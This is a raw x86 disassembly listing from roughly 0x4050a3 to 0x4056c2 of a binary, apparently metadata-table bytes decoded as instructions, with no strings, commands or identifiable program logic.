  4050a3:	00 70 02             	add    %dh,0x2(%eax)
  4050a6:	3f                   	aas
  4050a7:	00 06                	add    %al,(%esi)
  4050a9:	00 7f 02             	add    %bh,0x2(%edi)
  4050ac:	3c 00                	cmp    $0x0,%al
  4050ae:	06                   	push   %es
  4050af:	06                   	push   %es
  4050b0:	89 02                	mov    %eax,(%edx)
  4050b2:	39 00                	cmp    %eax,(%eax)
  4050b4:	56                   	push   %esi
  4050b5:	80 91 02 42 00 56 80 	adcb   $0x80,0x56004202(%ecx)
  4050bc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4050bd:	02 42 00             	add    0x0(%edx),%al
  4050c0:	56                   	push   %esi
  4050c1:	80 b3 02 42 00 56 80 	xorb   $0x80,0x56004202(%ebx)
  4050c8:	c9                   	leave
  4050c9:	02 42 00             	add    0x0(%edx),%al
  4050cc:	56                   	push   %esi
  4050cd:	80 de 02             	sbb    $0x2,%dh
  4050d0:	42                   	inc    %edx
  4050d1:	00 56 80             	add    %dl,-0x80(%esi)
  4050d4:	f2 02 42 00          	repnz add 0x0(%edx),%al
  4050d8:	56                   	push   %esi
  4050d9:	80 06 03             	addb   $0x3,(%esi)
  4050dc:	42                   	inc    %edx
  4050dd:	00 56 80             	add    %dl,-0x80(%esi)
  4050e0:	15 03 42 00 56       	adc    $0x56004203,%eax
  4050e5:	80 27 03             	andb   $0x3,(%edi)
  4050e8:	42                   	inc    %edx
  4050e9:	00 56 80             	add    %dl,-0x80(%esi)
  4050ec:	38 03                	cmp    %al,(%ebx)
  4050ee:	42                   	inc    %edx
  4050ef:	00 56 80             	add    %dl,-0x80(%esi)
  4050f2:	4a                   	dec    %edx
  4050f3:	03 42 00             	add    0x0(%edx),%eax
  4050f6:	56                   	push   %esi
  4050f7:	80 5c 03 42 00       	sbbb   $0x0,0x42(%ebx,%eax,1)
  4050fc:	56                   	push   %esi
  4050fd:	80 64 03 42 00       	andb   $0x0,0x42(%ebx,%eax,1)
  405102:	56                   	push   %esi
  405103:	80 76 03 42          	xorb   $0x42,0x3(%esi)
  405107:	00 56 80             	add    %dl,-0x80(%esi)
  40510a:	8a 03                	mov    (%ebx),%al
  40510c:	42                   	inc    %edx
  40510d:	00 56 80             	add    %dl,-0x80(%esi)
  405110:	9e                   	sahf
  405111:	03 42 00             	add    0x0(%edx),%eax
  405114:	56                   	push   %esi
  405115:	80 ba 03 42 00 06 06 	cmpb   $0x6,0x6004203(%edx)
  40511c:	89 02                	mov    %eax,(%edx)
  40511e:	39 00                	cmp    %eax,(%eax)
  405120:	56                   	push   %esi
  405121:	80 c8 03             	or     $0x3,%al
  405124:	9b                   	fwait
  405125:	00 56 80             	add    %dl,-0x80(%esi)
  405128:	d1 03                	roll   $1,(%ebx)
  40512a:	9b                   	fwait
  40512b:	00 56 80             	add    %dl,-0x80(%esi)
  40512e:	e1 03                	loope  0x405133
  405130:	9b                   	fwait
  405131:	00 56 80             	add    %dl,-0x80(%esi)
  405134:	fd                   	std
  405135:	03 9b 00 56 80 0d    	add    0xd805600(%ebx),%ebx
  40513b:	04 9b                	add    $0x9b,%al
  40513d:	00 56 80             	add    %dl,-0x80(%esi)
  405140:	28 04 9b             	sub    %al,(%ebx,%ebx,4)
  405143:	00 56 80             	add    %dl,-0x80(%esi)
  405146:	42                   	inc    %edx
  405147:	04 9b                	add    $0x9b,%al
  405149:	00 56 80             	add    %dl,-0x80(%esi)
  40514c:	5a                   	pop    %edx
  40514d:	04 9b                	add    $0x9b,%al
  40514f:	00 06                	add    %al,(%esi)
  405151:	00 6e 04             	add    %ch,0x4(%esi)
  405154:	3f                   	aas
  405155:	00 06                	add    %al,(%esi)
  405157:	00 73 04             	add    %dh,0x4(%ebx)
  40515a:	3f                   	aas
  40515b:	00 06                	add    %al,(%esi)
  40515d:	00 7c 04 3f          	add    %bh,0x3f(%esp,%eax,1)
  405161:	00 01                	add    %al,(%ecx)
  405163:	00 90 04 c7 00 01    	add    %dl,0x100c704(%eax)
  405169:	00 a3 04 c7 00 01    	add    %ah,0x100c704(%ebx)
  40516f:	00 51 05             	add    %dl,0x5(%ecx)
  405172:	f5                   	cmc
  405173:	00 06                	add    %al,(%esi)
  405175:	00 bf 07 98 01 06    	add    %bh,0x6019807(%edi)
  40517b:	00 cc                	add    %cl,%ah
  40517d:	07                   	pop    %es
  40517e:	9b                   	fwait
  40517f:	01 01                	add    %eax,(%ecx)
  405181:	00 0b                	add    %cl,(%ebx)
  405183:	08 c7                	or     %al,%bh
  405185:	00 01                	add    %al,(%ecx)
  405187:	00 30                	add    %dh,(%eax)
  405189:	08 a6 01 01 00 36    	or     %ah,0x36000101(%esi)
  40518f:	08 39                	or     %bh,(%ecx)
  405191:	00 01                	add    %al,(%ecx)
  405193:	00 40 08             	add    %al,0x8(%eax)
  405196:	39 00                	cmp    %eax,(%eax)
  405198:	01 00                	add    %eax,(%eax)
  40519a:	49                   	dec    %ecx
  40519b:	08 98 01 01 00 72    	or     %bl,0x72000101(%eax)
  4051a1:	08 aa 01 03 00 ff    	or     %ch,-0xfffcff(%edx)
  4051a7:	08 d7                	or     %dl,%bh
  4051a9:	01 03                	add    %eax,(%ebx)
  4051ab:	00 0a                	add    %cl,(%edx)
  4051ad:	09 d7                	or     %edx,%edi
  4051af:	01 03                	add    %eax,(%ebx)
  4051b1:	00 1f                	add    %bl,(%edi)
  4051b3:	09 db                	or     %ebx,%ebx
  4051b5:	01 03                	add    %eax,(%ebx)
  4051b7:	00 2e                	add    %ch,(%esi)
  4051b9:	09 d7                	or     %edx,%edi
  4051bb:	01 03                	add    %eax,(%ebx)
  4051bd:	00 3e                	add    %bh,(%esi)
  4051bf:	09 d7                	or     %edx,%edi
  4051c1:	01 03                	add    %eax,(%ebx)
  4051c3:	00 4a 09             	add    %cl,0x9(%edx)
  4051c6:	39 00                	cmp    %eax,(%eax)
  4051c8:	03 00                	add    (%eax),%eax
  4051ca:	55                   	push   %ebp
  4051cb:	09 39                	or     %edi,(%ecx)
  4051cd:	00 03                	add    %al,(%ebx)
  4051cf:	00 66 09             	add    %ah,0x9(%esi)
  4051d2:	39 00                	cmp    %eax,(%eax)
  4051d4:	06                   	push   %es
  4051d5:	06                   	push   %es
  4051d6:	89 02                	mov    %eax,(%edx)
  4051d8:	ef                   	out    %eax,(%dx)
  4051d9:	01 56 80             	add    %edx,-0x80(%esi)
  4051dc:	bc 09 f2 01 56       	mov    $0x5601f209,%esp
  4051e1:	80 ce 09             	or     $0x9,%dh
  4051e4:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  4051e8:	dd 09                	fisttpll (%ecx)
  4051ea:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  4051ee:	ec                   	in     (%dx),%al
  4051ef:	09 f2                	or     %esi,%edx
  4051f1:	01 56 80             	add    %edx,-0x80(%esi)
  4051f4:	fb                   	sti
  4051f5:	09 f2                	or     %esi,%edx
  4051f7:	01 06                	add    %eax,(%esi)
  4051f9:	06                   	push   %es
  4051fa:	89 02                	mov    %eax,(%edx)
  4051fc:	ef                   	out    %eax,(%dx)
  4051fd:	01 56 80             	add    %edx,-0x80(%esi)
  405200:	0c 0a                	or     $0xa,%al
  405202:	00 02                	add    %al,(%edx)
  405204:	56                   	push   %esi
  405205:	80 1d 0a 00 02 56 80 	sbbb   $0x80,0x5602000a
  40520c:	2f                   	das
  40520d:	0a 00                	or     (%eax),%al
  40520f:	02 01                	add    (%ecx),%al
  405211:	00 40 0a             	add    %al,0xa(%eax)
  405214:	13 02                	adc    (%edx),%eax
  405216:	06                   	push   %es
  405217:	00 46 0a             	add    %al,0xa(%esi)
  40521a:	c7 00 06 00 5b 0a    	movl   $0xa5b0006,(%eax)
  405220:	c7 00 06 00 70 0a    	movl   $0xa700006,(%eax)
  405226:	c7 00 06 00 87 0a    	movl   $0xa870006,(%eax)
  40522c:	c7 00 06 00 9e 0a    	movl   $0xa9e0006,(%eax)
  405232:	c7 00 06 00 b3 0a    	movl   $0xab30006,(%eax)
  405238:	c7 00 06 00 c8 0a    	movl   $0xac80006,(%eax)
  40523e:	c7 00 06 00 df 0a    	movl   $0xadf0006,(%eax)
  405244:	c7 00 06 00 f6 0a    	movl   $0xaf60006,(%eax)
  40524a:	c7 00 06 00 0e 0b    	movl   $0xb0e0006,(%eax)
  405250:	c7 00 01 00 8f 0b    	movl   $0xb8f0001,(%eax)
  405256:	3f                   	aas
  405257:	00 01                	add    %al,(%ecx)
  405259:	00 9a 0b 3f 00 06    	add    %bl,0x6003f0b(%edx)
  40525f:	00 1c 0c             	add    %bl,(%esp,%ecx,1)
  405262:	63 02                	arpl   %eax,(%edx)
  405264:	01 00                	add    %eax,(%eax)
  405266:	55                   	push   %ebp
  405267:	0c 73                	or     $0x73,%al
  405269:	02 01                	add    (%ecx),%al
  40526b:	00 5c 0c 77          	add    %bl,0x77(%esp,%ecx,1)
  40526f:	02 01                	add    (%ecx),%al
  405271:	00 80 0c 7b 02 01    	add    %al,0x1027b0c(%eax)
  405277:	00 94 0c 7b 02 01 00 	add    %dl,0x1027b(%esp,%ecx,1)
  40527e:	af                   	scas   %es:(%edi),%eax
  40527f:	0c 80                	or     $0x80,%al
  405281:	02 01                	add    (%ecx),%al
  405283:	00 c4                	add    %al,%ah
  405285:	0c 92                	or     $0x92,%al
  405287:	02 01                	add    (%ecx),%al
  405289:	00 ce                	add    %cl,%dh
  40528b:	0d 77 02 01 00       	or     $0x10277,%eax
  405290:	2e 10 98 01 01 00 39 	adc    %bl,%cs:0x39000101(%eax)
  405297:	10 39                	adc    %bh,(%ecx)
  405299:	00 06                	add    %al,(%esi)
  40529b:	00 5c 0c 77          	add    %bl,0x77(%esp,%ecx,1)
  40529f:	02 06                	add    (%esi),%al
  4052a1:	00 5e 1e             	add    %bl,0x1e(%esi)
  4052a4:	81 06 00 00 00 00    	addl   $0x0,(%esi)
  4052aa:	80 00 91             	addb   $0x91,(%eax)
  4052ad:	20 f4                	and    %dh,%ah
  4052af:	01 13                	add    %edx,(%ebx)
  4052b1:	00 01                	add    %al,(%ecx)
  4052b3:	00 50 20             	add    %dl,0x20(%eax)
  4052b6:	00 00                	add    %al,(%eax)
  4052b8:	00 00                	add    %al,(%eax)
  4052ba:	93                   	xchg   %eax,%ebx
  4052bb:	00 37                	add    %dh,(%edi)
  4052bd:	02 28                	add    (%eax),%ch
  4052bf:	00 0b                	add    %cl,(%ebx)
  4052c1:	00 2a                	add    %ch,(%edx)
  4052c3:	21 00                	and    %eax,(%eax)
  4052c5:	00 00                	add    %al,(%eax)
  4052c7:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  4052cd:	00 11                	add    %dl,(%ecx)
  4052cf:	00 32                	add    %dh,(%edx)
  4052d1:	21 00                	and    %eax,(%eax)
  4052d3:	00 00                	add    %al,(%eax)
  4052d5:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  4052db:	00 11                	add    %dl,(%ecx)
  4052dd:	00 5b 21             	add    %bl,0x21(%ebx)
  4052e0:	00 00                	add    %al,(%eax)
  4052e2:	00 00                	add    %al,(%eax)
  4052e4:	c6                   	(bad)
  4052e5:	08 b6 04 cb 00 11    	or     %dh,0x1100cb04(%esi)
  4052eb:	00 63 21             	add    %ah,0x21(%ebx)
  4052ee:	00 00                	add    %al,(%eax)
  4052f0:	00 00                	add    %al,(%eax)
  4052f2:	c6                   	(bad)
  4052f3:	08 ca                	or     %cl,%dl
  4052f5:	04 d0                	add    $0xd0,%al
  4052f7:	00 11                	add    %dl,(%ecx)
  4052f9:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  4052fd:	00 00                	add    %al,(%eax)
  4052ff:	00 c6                	add    %al,%dh
  405301:	08 e3                	or     %ah,%bl
  405303:	04 d6                	add    $0xd6,%al
  405305:	00 12                	add    %dl,(%edx)
  405307:	00 77 21             	add    %dh,0x21(%edi)
  40530a:	00 00                	add    %al,(%eax)
  40530c:	00 00                	add    %al,(%eax)
  40530e:	c6                   	(bad)
  40530f:	08 f2                	or     %dh,%dl
  405311:	04 db                	add    $0xdb,%al
  405313:	00 12                	add    %dl,(%edx)
  405315:	00 79 21             	add    %bh,0x21(%ecx)
  405318:	00 00                	add    %al,(%eax)
  40531a:	00 00                	add    %al,(%eax)
  40531c:	c6                   	(bad)
  40531d:	08 0d 05 e1 00 13    	or     %cl,0x1300e105
  405323:	00 82 21 00 00 00    	add    %al,0x21(%edx)
  405329:	00 c6                	add    %al,%dh
  40532b:	08 20                	or     %ah,(%eax)
  40532d:	05 e6 00 13 00       	add    $0x1300e6,%eax
  405332:	84 21                	test   %ah,(%ecx)
  405334:	00 00                	add    %al,(%eax)
  405336:	00 00                	add    %al,(%eax)
  405338:	c6                   	(bad)
  405339:	08 33                	or     %dh,(%ebx)
  40533b:	05 ec 00 14 00       	add    $0x1400ec,%eax
  405340:	88 21                	mov    %ah,(%ecx)
  405342:	00 00                	add    %al,(%eax)
  405344:	00 00                	add    %al,(%eax)
  405346:	c6                   	(bad)
  405347:	08 42 05             	or     %al,0x5(%edx)
  40534a:	f0 00 14 00          	lock add %dl,(%eax,%eax,1)
  40534e:	8c 21                	mov    %fs,(%ecx)
  405350:	00 00                	add    %al,(%eax)
  405352:	00 00                	add    %al,(%eax)
  405354:	c6 00 60             	movb   $0x60,(%eax)
  405357:	05 35 00 15 00       	add    $0x150035,%eax
  40535c:	eb 21                	jmp    0x40537f
  40535e:	00 00                	add    %al,(%eax)
  405360:	00 00                	add    %al,(%eax)
  405362:	c6                   	(bad)
  405363:	08 71 05             	or     %dh,0x5(%ecx)
  405366:	cb                   	lret
  405367:	00 15 00 f3 21 00    	add    %dl,0x21f300
  40536d:	00 00                	add    %al,(%eax)
  40536f:	00 c6                	add    %al,%dh
  405371:	08 85 05 d0 00 15    	or     %al,0x1500d005(%ebp)
  405377:	00 fc                	add    %bh,%ah
  405379:	21 00                	and    %eax,(%eax)
  40537b:	00 00                	add    %al,(%eax)
  40537d:	00 c6                	add    %al,%dh
  40537f:	00 ae 05 f9 00 16    	add    %ch,0x1600f905(%esi)
  405385:	00 87 22 00 00 00    	add    %al,0x22(%edi)
  40538b:	00 c6                	add    %al,%dh
  40538d:	08 c0                	or     %al,%al
  40538f:	05 06 01 17 00       	add    $0x170106,%eax
  405394:	8a 22                	mov    (%edx),%ah
  405396:	00 00                	add    %al,(%eax)
  405398:	00 00                	add    %al,(%eax)
  40539a:	c6                   	(bad)
  40539b:	08 d1                	or     %dl,%cl
  40539d:	05 d6 00 17 00       	add    $0x1700d6,%eax
  4053a2:	98                   	cwtl
  4053a3:	22 00                	and    (%eax),%al
  4053a5:	00 00                	add    %al,(%eax)
  4053a7:	00 c6                	add    %al,%dh
  4053a9:	08 eb                	or     %ch,%bl
  4053ab:	05 d6 00 17 00       	add    $0x1700d6,%eax
  4053b0:	a3 22 00 00 00       	mov    %eax,0x22
  4053b5:	00 c6                	add    %al,%dh
  4053b7:	00 14 06             	add    %dl,(%esi,%eax,1)
  4053ba:	0a 01                	or     (%ecx),%al
  4053bc:	17                   	pop    %ss
  4053bd:	00 cb                	add    %cl,%bl
  4053bf:	22 00                	and    (%eax),%al
  4053c1:	00 00                	add    %al,(%eax)
  4053c3:	00 c6                	add    %al,%dh
  4053c5:	00 1c 06             	add    %bl,(%esi,%eax,1)
  4053c8:	11 01                	adc    %eax,(%ecx)
  4053ca:	18 00                	sbb    %al,(%eax)
  4053cc:	cd 22                	int    $0x22
  4053ce:	00 00                	add    %al,(%eax)
  4053d0:	00 00                	add    %al,(%eax)
  4053d2:	c6 00 31             	movb   $0x31,(%eax)
  4053d5:	06                   	push   %es
  4053d6:	1d 01 1c 00 cf       	sbb    $0xcf001c01,%eax
  4053db:	22 00                	and    (%eax),%al
  4053dd:	00 00                	add    %al,(%eax)
  4053df:	00 c6                	add    %al,%dh
  4053e1:	00 31                	add    %dh,(%ecx)
  4053e3:	06                   	push   %es
  4053e4:	25 01 1e 00 d4       	and    $0xd4001e01,%eax
  4053e9:	22 00                	and    (%eax),%al
  4053eb:	00 00                	add    %al,(%eax)
  4053ed:	00 c6                	add    %al,%dh
  4053ef:	08 43 06             	or     %al,0x6(%ebx)
  4053f2:	e1 00                	loope  0x4053f4
  4053f4:	20 00                	and    %al,(%eax)
  4053f6:	fa                   	cli
  4053f7:	22 00                	and    (%eax),%al
  4053f9:	00 00                	add    %al,(%eax)
  4053fb:	00 c6                	add    %al,%dh
  4053fd:	08 56 06             	or     %dl,0x6(%esi)
  405400:	e6 00                	out    %al,$0x0
  405402:	20 00                	and    %al,(%eax)
  405404:	fc                   	cld
  405405:	22 00                	and    (%eax),%al
  405407:	00 00                	add    %al,(%eax)
  405409:	00 c6                	add    %al,%dh
  40540b:	08 69 06             	or     %ch,0x6(%ecx)
  40540e:	d6                   	salc
  40540f:	00 21                	add    %ah,(%ecx)
  405411:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  405414:	00 00                	add    %al,(%eax)
  405416:	00 00                	add    %al,(%eax)
  405418:	c6                   	(bad)
  405419:	08 78 06             	or     %bh,0x6(%eax)
  40541c:	db 00                	fildl  (%eax)
  40541e:	21 00                	and    %eax,(%eax)
  405420:	26 23 00             	and    %es:(%eax),%eax
  405423:	00 00                	add    %al,(%eax)
  405425:	00 c6                	add    %al,%dh
  405427:	08 87 06 33 01 22    	or     %al,0x22013306(%edi)
  40542d:	00 32                	add    %dh,(%edx)
  40542f:	23 00                	and    (%eax),%eax
  405431:	00 00                	add    %al,(%eax)
  405433:	00 c6                	add    %al,%dh
  405435:	08 97 06 37 01 22    	or     %dl,0x22013706(%edi)
  40543b:	00 34 23             	add    %dh,(%ebx,%eiz,1)
  40543e:	00 00                	add    %al,(%eax)
  405440:	00 00                	add    %al,(%eax)
  405442:	86 18                	xchg   %bl,(%eax)
  405444:	49                   	dec    %ecx
  405445:	02 35 00 23 00 00    	add    0x2300,%dh
  40544b:	00 00                	add    %al,(%eax)
  40544d:	00 80 00 91 20 43    	add    %al,0x43209100(%eax)
  405453:	07                   	pop    %es
  405454:	57                   	push   %edi
  405455:	01 23                	add    %esp,(%ebx)
  405457:	00 44 23 00          	add    %al,0x0(%ebx,%eiz,1)
  40545b:	00 00                	add    %al,(%eax)
  40545d:	00 96 00 5d 07 5c    	add    %dl,0x5c075d00(%esi)
  405463:	01 24 00             	add    %esp,(%eax,%eax,1)
  405466:	b4 25                	mov    $0x25,%ah
  405468:	00 00                	add    %al,(%eax)
  40546a:	00 00                	add    %al,(%eax)
  40546c:	96                   	xchg   %eax,%esi
  40546d:	00 5d 07             	add    %bl,0x7(%ebp)
  405470:	66 01 28             	add    %bp,(%eax)
  405473:	00 bf 25 00 00 00    	add    %bh,0x25(%edi)
  405479:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  40547f:	00 2b                	add    %ch,(%ebx)
  405481:	00 c8                	add    %cl,%al
  405483:	25 00 00 00 00       	and    $0x0,%eax
  405488:	96                   	xchg   %eax,%esi
  405489:	00 5d 07             	add    %bl,0x7(%ebp)
  40548c:	6f                   	outsl  %ds:(%esi),(%dx)
  40548d:	01 2b                	add    %ebp,(%ebx)
  40548f:	00 f8                	add    %bh,%al
  405491:	28 00                	sub    %al,(%eax)
  405493:	00 00                	add    %al,(%eax)
  405495:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  40549b:	00 2f                	add    %ch,(%edi)
  40549d:	00 00                	add    %al,(%eax)
  40549f:	00 00                	add    %al,(%eax)
  4054a1:	00 80 00 96 20 a0    	add    %al,-0x5fdf6a00(%eax)
  4054a7:	07                   	pop    %es
  4054a8:	7c 01                	jl     0x4054ab
  4054aa:	2f                   	das
  4054ab:	00 00                	add    %al,(%eax)
  4054ad:	29 00                	sub    %eax,(%eax)
  4054af:	00 00                	add    %al,(%eax)
  4054b1:	00 91 00 af 07 88    	add    %dl,-0x77f85100(%ecx)
  4054b7:	01 35 00 5c 29 00    	add    %esi,0x295c00
  4054bd:	00 00                	add    %al,(%eax)
  4054bf:	00 96 00 5d 07 90    	add    %dl,-0x6ff8a300(%esi)
  4054c5:	01 38                	add    %edi,(%eax)
  4054c7:	00 7c 2a 00          	add    %bh,0x0(%edx,%ebp,1)
  4054cb:	00 00                	add    %al,(%eax)
  4054cd:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  4054d3:	00 3b                	add    %bh,(%ebx)
  4054d5:	00 84 2a 00 00 00 00 	add    %al,0x0(%edx,%ebp,1)
  4054dc:	86 18                	xchg   %bl,(%eax)
  4054de:	49                   	dec    %ecx
  4054df:	02 35 00 3b 00 e0    	add    0xe0003b00,%dh
  4054e5:	2a 00                	sub    (%eax),%al
  4054e7:	00 00                	add    %al,(%eax)
  4054e9:	00 81 00 e1 07 9f    	add    %al,-0x60f81f00(%ecx)
  4054ef:	01 3b                	add    %edi,(%ebx)
  4054f1:	00 1c 2c             	add    %bl,(%esp,%ebp,1)
  4054f4:	00 00                	add    %al,(%eax)
  4054f6:	00 00                	add    %al,(%eax)
  4054f8:	81 00 f7 07 9f 01    	addl   $0x19f07f7,(%eax)
  4054fe:	3d 00 58 2d 00       	cmp    $0x2d5800,%eax
  405503:	00 00                	add    %al,(%eax)
  405505:	00 81 00 98 08 bb    	add    %al,-0x44f76800(%ecx)
  40550b:	01 3f                	add    %edi,(%edi)
  40550d:	00 40 2e             	add    %al,0x2e(%eax)
  405510:	00 00                	add    %al,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	81 00 a5 08 35 00    	addl   $0x3508a5,(%eax)
  40551a:	40                   	inc    %eax
  40551b:	00 14 2f             	add    %dl,(%edi,%ebp,1)
  40551e:	00 00                	add    %al,(%eax)
  405520:	00 00                	add    %al,(%eax)
  405522:	81 00 ca 08 c2 01    	addl   $0x1c208ca,(%eax)
  405528:	40                   	inc    %eax
  405529:	00 90 2f 00 00 00    	add    %dl,0x2f(%eax)
  40552f:	00 81 00 d3 08 c9    	add    %al,-0x36f72d00(%ecx)
  405535:	01 42 00             	add    %eax,0x0(%edx)
  405538:	1f                   	pop    %ds
  405539:	32 00                	xor    (%eax),%al
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 86 00 da 08 ec    	add    %al,-0x13f72600(%esi)
  405543:	00 44 00 2c          	add    %al,0x2c(%eax,%eax,1)
  405547:	32 00                	xor    (%eax),%al
  405549:	00 00                	add    %al,(%eax)
  40554b:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  405551:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  405555:	32 00                	xor    (%eax),%al
  405557:	00 00                	add    %al,(%eax)
  405559:	00 86 18 49 02 d0    	add    %al,-0x2ffdb6e8(%esi)
  40555f:	00 44 00 a8          	add    %al,-0x58(%eax,%eax,1)
  405563:	32 00                	xor    (%eax),%al
  405565:	00 00                	add    %al,(%eax)
  405567:	00 86 00 f2 08 d1    	add    %al,-0x2ef70e00(%esi)
  40556d:	01 45 00             	add    %eax,0x0(%ebp)
  405570:	00 00                	add    %al,(%eax)
  405572:	00 00                	add    %al,(%eax)
  405574:	80 00 91             	addb   $0x91,(%eax)
  405577:	20 6c 09 df          	and    %ch,-0x21(%ecx,%ecx,1)
  40557b:	01 46 00             	add    %eax,0x0(%esi)
  40557e:	00 00                	add    %al,(%eax)
  405580:	00 00                	add    %al,(%eax)
  405582:	80 00 91             	addb   $0x91,(%eax)
  405585:	20 79 09             	and    %bh,0x9(%ecx)
  405588:	e5 01                	in     $0x1,%eax
  40558a:	47                   	inc    %edi
  40558b:	00 f0                	add    %dh,%al
  40558d:	3a 00                	cmp    (%eax),%al
  40558f:	00 00                	add    %al,(%eax)
  405591:	00 96 00 85 09 eb    	add    %dl,-0x14f67b00(%esi)
  405597:	01 48 00             	add    %ecx,0x0(%eax)
  40559a:	18 3b                	sbb    %bh,(%ebx)
  40559c:	00 00                	add    %al,(%eax)
  40559e:	00 00                	add    %al,(%eax)
  4055a0:	96                   	xchg   %eax,%esi
  4055a1:	00 97 09 eb 01 48    	add    %dl,0x4801eb09(%edi)
  4055a7:	00 40 3b             	add    %al,0x3b(%eax)
  4055aa:	00 00                	add    %al,(%eax)
  4055ac:	00 00                	add    %al,(%eax)
  4055ae:	96                   	xchg   %eax,%esi
  4055af:	00 aa 09 eb 01 48    	add    %ch,0x4801eb09(%edx)
  4055b5:	00 66 3b             	add    %ah,0x3b(%esi)
  4055b8:	00 00                	add    %al,(%eax)
  4055ba:	00 00                	add    %al,(%eax)
  4055bc:	86 18                	xchg   %bl,(%eax)
  4055be:	49                   	dec    %ecx
  4055bf:	02 35 00 48 00 70    	add    0x70004800,%dh
  4055c5:	3b 00                	cmp    (%eax),%eax
  4055c7:	00 00                	add    %al,(%eax)
  4055c9:	00 86 18 49 02 35    	add    %al,0x35024918(%esi)
  4055cf:	00 48 00             	add    %cl,0x0(%eax)
  4055d2:	bc 3b 00 00 00       	mov    $0x3b,%esp
  4055d7:	00 c6                	add    %al,%dh
  4055d9:	00 4d 0b             	add    %cl,0xb(%ebp)
  4055dc:	17                   	pop    %ss
  4055dd:	02 48 00             	add    0x0(%eax),%cl
  4055e0:	70 3f                	jo     0x405621
  4055e2:	00 00                	add    %al,(%eax)
  4055e4:	00 00                	add    %al,(%eax)
  4055e6:	c6 00 54             	movb   $0x54,(%eax)
  4055e9:	0b 2a                	or     (%edx),%ebp
  4055eb:	02 4b 00             	add    0x0(%ebx),%cl
  4055ee:	90                   	nop
  4055ef:	3f                   	aas
  4055f0:	00 00                	add    %al,(%eax)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	c6 00 71             	movb   $0x71,(%eax)
  4055f7:	0b 37                	or     (%edi),%esi
  4055f9:	02 4f 00             	add    0x0(%edi),%cl
  4055fc:	f0 3f                	lock aas
  4055fe:	00 00                	add    %al,(%eax)
  405600:	00 00                	add    %al,(%eax)
  405602:	c6 00 71             	movb   $0x71,(%eax)
  405605:	0b 45 02             	or     0x2(%ebp),%eax
  405608:	55                   	push   %ebp
  405609:	00 4b 40             	add    %cl,0x40(%ebx)
  40560c:	00 00                	add    %al,(%eax)
  40560e:	00 00                	add    %al,(%eax)
  405610:	c6                   	(bad)
  405611:	08 85 0b 4f 02 59    	or     %al,0x59024f0b(%ebp)
  405617:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  40561b:	00 00                	add    %al,(%eax)
  40561d:	00 c6                	add    %al,%dh
  40561f:	00 a5 0b 33 01 59    	add    %ah,0x5901330b(%ebp)
  405625:	00 84 40 00 00 00 00 	add    %al,0x0(%eax,%eax,2)
  40562c:	81 00 cb 0b 54 02    	addl   $0x2540bcb,(%eax)
  405632:	59                   	pop    %ecx
  405633:	00 00                	add    %al,(%eax)
  405635:	41                   	inc    %ecx
  405636:	00 00                	add    %al,(%eax)
  405638:	00 00                	add    %al,(%eax)
  40563a:	c6 00 d7             	movb   $0xd7,(%eax)
  40563d:	0b 54 02 59          	or     0x59(%edx,%eax,1),%edx
  405641:	00 58 41             	add    %bl,0x41(%eax)
  405644:	00 00                	add    %al,(%eax)
  405646:	00 00                	add    %al,(%eax)
  405648:	c6 00 ee             	movb   $0xee,(%eax)
  40564b:	0b 5a 02             	or     0x2(%edx),%ebx
  40564e:	59                   	pop    %ecx
  40564f:	00 5a 41             	add    %bl,0x41(%edx)
  405652:	00 00                	add    %al,(%eax)
  405654:	00 00                	add    %al,(%eax)
  405656:	c6 00 ee             	movb   $0xee,(%eax)
  405659:	0b 37                	or     (%edi),%esi
  40565b:	01 5c 00 5c          	add    %ebx,0x5c(%eax,%eax,1)
  40565f:	41                   	inc    %ecx
  405660:	00 00                	add    %al,(%eax)
  405662:	00 00                	add    %al,(%eax)
  405664:	c6 00 f4             	movb   $0xf4,(%eax)
  405667:	0b 37                	or     (%edi),%esi
  405669:	01 5d 00             	add    %ebx,0x0(%ebp)
  40566c:	5e                   	pop    %esi
  40566d:	41                   	inc    %ecx
  40566e:	00 00                	add    %al,(%eax)
  405670:	00 00                	add    %al,(%eax)
  405672:	c6 00 03             	movb   $0x3,(%eax)
  405675:	0c 37                	or     $0x37,%al
  405677:	01 5e 00             	add    %ebx,0x0(%esi)
  40567a:	60                   	pusha
  40567b:	41                   	inc    %ecx
  40567c:	00 00                	add    %al,(%eax)
  40567e:	00 00                	add    %al,(%eax)
  405680:	c6 00 12             	movb   $0x12,(%eax)
  405683:	0c 35                	or     $0x35,%al
  405685:	00 5f 00             	add    %bl,0x0(%edi)
  405688:	62 41 00             	bound  %eax,0x0(%ecx)
  40568b:	00 00                	add    %al,(%eax)
  40568d:	00 c6                	add    %al,%dh
  40568f:	00 12                	add    %dl,(%edx)
  405691:	0c 5a                	or     $0x5a,%al
  405693:	02 5f 00             	add    0x0(%edi),%bl
  405696:	64 41                	fs inc %ecx
  405698:	00 00                	add    %al,(%eax)
  40569a:	00 00                	add    %al,(%eax)
  40569c:	c6 00 12             	movb   $0x12,(%eax)
  40569f:	0c 37                	or     $0x37,%al
  4056a1:	01 62 00             	add    %esp,0x0(%edx)
  4056a4:	68 41 00 00 00       	push   $0x41
  4056a9:	00 c6                	add    %al,%dh
  4056ab:	00 1f                	add    %bl,(%edi)
  4056ad:	0c 67                	or     $0x67,%al
  4056af:	02 63 00             	add    0x0(%ebx),%ah
  4056b2:	cc                   	int3
  4056b3:	41                   	inc    %ecx
  4056b4:	00 00                	add    %al,(%eax)
  4056b6:	00 00                	add    %al,(%eax)
  4056b8:	c6 00 2d             	movb   $0x2d,(%eax)
  4056bb:	0c 37                	or     $0x37,%al
  4056bd:	01 65 00             	add    %esp,0x0(%ebp)
  4056c0:	ce                   	into
  4056c1:	41                   	inc    %ecx
  4056c2:	00 00                	add    %al,(%eax)
